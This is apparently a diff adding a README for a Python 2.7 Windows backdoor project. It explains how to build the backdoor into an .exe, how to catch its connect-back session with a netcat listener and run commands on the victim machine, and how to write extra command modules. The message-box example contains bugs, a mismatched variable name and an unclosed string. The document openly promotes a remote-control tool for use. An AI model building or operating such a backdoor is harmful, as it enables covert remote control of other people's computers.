@@ -1,0 +1,36 @@
+I will provide to tutorials for this, one for the users of the backdoor and one for the guys who want to develop their own commands or contribute to this project.
+
+
+USERS TUTORIAL:
+For generating a backdoor you currently have to install python 2.7 and pywin32 on your computer(if you want to compile it to a .exe pyinstaller too).
+once you have done that just execute the generate.py file if you want to make it an exe file enter Y at the pyinstaller question.
+As a listener just use any linux computer and type in: nc -lp <port number> once it connects back to you you will be able to execute commands.
+You can list all commands and their purpose with help and background a session with quit. If you want to execute the script on another machine uncompiled the
+machine has to have python 2.7 plus third party libs installed and you have to put the cmds.py file to the PYTHONPATH or in the same dir as the backdoor
+
+
+DEVELOPERS TUTORIAL:
+All commands are saved as a python class in the cmds.py file. If you want to create your own command and or contribute you will have to write your own python class.
+I will give two simple example on how to make a small module:
+
+import ctypes #imports for this module you can write them at the top too
+class messagebox:
+	def __init__(self):#the constructor musn´t contain arguments
+		self.command = 'messagebox' #this is the command you have to enter in order to execute this module
+		self.description = 'generating a custom messagebox with: messagebox <message> <window title> #the description for the help message
+		self.args = True #for showing that this function gets what stands after its command like: messagebox x y the function will get the string 'x y'
+	def main(self,arg): #the method which will be executed when you call the module
+		Box = ctypes.windll.user32.MessageBoxA
+		Box(None,args.split(" ")[0],args.split(" ")[1], 0)
+		return "Message box was closed\n"
+and now the example without an argument
+
+import getpass
+class getuser:
+	def __init__(self):#the constructor musn´t contain arguments
+		self.command = 'getusername' #this is the command you have to enter in order to execute this module
+		self.description = 'giving you the username of the currently logged in user' #the description for the help message
+		self.args = False #for showing that this function gets no arguments
+	def main(self):
+		return getpass.getuser()+'\n'
+two more important notes the script is only able to send strings so please return a string and ad a '\n' to it in order to make netcat jump to the next line
